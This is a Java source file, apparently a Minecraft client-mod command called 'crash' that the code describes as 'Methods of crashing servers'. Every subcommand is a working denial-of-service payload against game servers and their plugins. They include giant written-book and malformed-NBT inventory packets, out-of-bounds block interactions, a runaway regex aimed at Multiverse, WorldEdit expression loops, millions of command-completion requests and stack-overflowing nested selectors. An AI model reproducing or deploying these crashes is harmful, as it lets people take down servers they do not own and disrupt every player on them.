package puyodead1.mlp.modules.commands;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.component.type.WrittenBookContentComponent;
import net.minecraft.entity.Entity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.text.RawFilteredPair;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import puyodead1.mlp.utils.Utils;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class CrashCommand extends Command {
    public MinecraftClient mc = MinecraftClient.getInstance();

    public CrashCommand() {
        super("crash", "Methods of crashing servers", "serverCrash");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("rider").executes(context -> {
            Entity ridingEntity = mc.player.getVehicle();
            if (ridingEntity == null) {
                error("Get in a vehicle first...");
                return 0;
            }
            mc.world.removeEntity(ridingEntity.getId(), Entity.RemovalReason.CHANGED_DIMENSION);
            Vec3d forward = Vec3d.fromPolar(0, mc.player.getYaw()).normalize().multiply(20000000.0F);
            for (int i = 0; i < 100; i++) {
                ridingEntity.updatePosition(mc.player.getX() + forward.x, mc.player.getY(), mc.player.getZ() + forward.z);
                mc.player.networkHandler.sendPacket(VehicleMoveC2SPacket.fromVehicle(ridingEntity));
            }

            return SINGLE_SUCCESS;
        }));

        builder.then(literal("book").then(argument("size", IntegerArgumentType.integer(1)).executes(context -> {
            int size = IntegerArgumentType.getInteger(context, "size");
            for (int i = 0; i < size; i++) {
                ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
                List<RawFilteredPair<Text>> pages = new ArrayList<>();

                for (int j = 0; j < 3000000; j++) {
                    pages.add(RawFilteredPair.of(Text.of("::::::::::".repeat(250))));
                }
                RawFilteredPair<String> title = RawFilteredPair.of(Utils.randomString(32));
                String author = Utils.randomString(32);

                crash.apply(DataComponentTypes.WRITTEN_BOOK_CONTENT, WrittenBookContentComponent.DEFAULT, component -> new WrittenBookContentComponent(title, author, 1, pages, true));
                mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(25, crash));
            }

            return SINGLE_SUCCESS;
        })));

        builder.then(literal("malformednbt").executes(context -> {
            ItemStack ez = new ItemStack(Items.CHEST, 1);
            NbtCompound nbt = new NbtCompound();
            nbt.put("x", NbtDouble.of(Double.POSITIVE_INFINITY));
            nbt.put("y", NbtDouble.of(0.0d));
            nbt.put("z", NbtDouble.of(Double.NEGATIVE_INFINITY));
            NbtCompound fuck = new NbtCompound();
            fuck.put("BlockEntityTag", nbt);

            ez.set(DataComponentTypes.BLOCK_ENTITY_DATA, NbtComponent.of(nbt));
            mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(25, ez));

            return SINGLE_SUCCESS;
        }));

        builder.then(literal("move").then(argument("size", IntegerArgumentType.integer(1)).executes(context -> {
            int size = IntegerArgumentType.getInteger(context, "size");

            for (int i = 0; i < 250; i++) {
                mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (i * size), mc.player.getY(), mc.player.getZ() + (i * size), true, false));
            }
            return SINGLE_SUCCESS;
        })));

        builder.then(literal("chunkoob").executes(context -> {
            mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos((int) Double.POSITIVE_INFINITY, 69, (int) Double.POSITIVE_INFINITY), true), 0));

            return SINGLE_SUCCESS;
        }));

        builder.then(literal("mvcrash").executes(context -> {
            mc.player.networkHandler.sendChatCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*." + "*.".repeat(new Random().nextInt(6)) + "++)$^");

            return SINGLE_SUCCESS;
        }));

        builder.then(literal("playtime").then(argument("size", IntegerArgumentType.integer(1)).executes(context -> {
            int size = IntegerArgumentType.getInteger(context, "size");

            for (int i = 0; i < size; i++) {
                mc.player.networkHandler.sendChatCommand("playtime " + Utils.randomString(1));
            }
            return SINGLE_SUCCESS;
        })));

        builder.then(literal("playtimeold").then(argument("size", IntegerArgumentType.integer(1)).executes(context -> {
            int size = IntegerArgumentType.getInteger(context, "size");

            for (int i = 0; i < size; i++) {
                mc.player.networkHandler.sendChatCommand("playtime %¤#\"%¤#\"%¤#\"%¤#");
            }
            return SINGLE_SUCCESS;
        })));

        builder.then(literal("lag").executes(context -> {
            for (int i = 0; i < 3000000; i++) {
                mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
            }

            return SINGLE_SUCCESS;
        }));

        builder.then(literal("lag2").executes(context -> {
            for (int i = 0; i < 255; i++) {
                mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
            }

            return SINGLE_SUCCESS;
        }));

        builder.then(literal("maptool").then(argument("size", IntegerArgumentType.integer(1)).executes(context -> {
            int size = IntegerArgumentType.getInteger(context, "size");

            mc.player.networkHandler.sendChatCommand("maptool new https://i.imgur.com/6Y9ykLR.png resize " + size + " " + size + "");

            return SINGLE_SUCCESS;
        })));

        builder.then(literal("fawe").executes(context -> {
            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(new Random().nextInt(100), "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));

            return SINGLE_SUCCESS;
        }));

        builder.then(literal("stackoverflow").executes(context -> {
            String overflow = generateJsonObject(2032);

            String command = "msg @a[nbt=" + overflow + "]";

            for (int i = 0; i < 3; i++) {
                mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, command));
            }

            return SINGLE_SUCCESS;
        }));
    }

    private String generateJsonObject(int levels) {
        String in = IntStream.range(0, levels).mapToObj(i -> "[").collect(Collectors.joining());
        String json = "{a:" + in + "}";
        return json;
    }
}
